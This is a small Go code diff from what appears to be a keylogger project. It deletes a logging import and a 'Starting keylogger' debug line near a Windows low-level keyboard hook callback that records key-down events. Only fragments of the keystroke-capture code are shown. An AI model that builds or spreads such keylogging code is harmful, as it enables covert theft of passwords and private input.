@@ -7,7 +7,6 @@ import (
 	"unsafe"
 	"strconv"
 
-	"github.com/kataras/golog"
 )
 
 func GetKeyboardLayout() string {
@@ -36,7 +35,6 @@ func StartKeylogger() error{
 			Time        uint32
 			DwExtraInfo uintptr
 		}
-		golog.Debug("Starting keylogger")
 		// Callback to process low-level keyboard events
 		hookProc := syscall.NewCallback(func(nCode int, wParam uintptr, lParam uintptr) uintptr {
 			// Only log for WM_KEYDOWN event (0x0100)
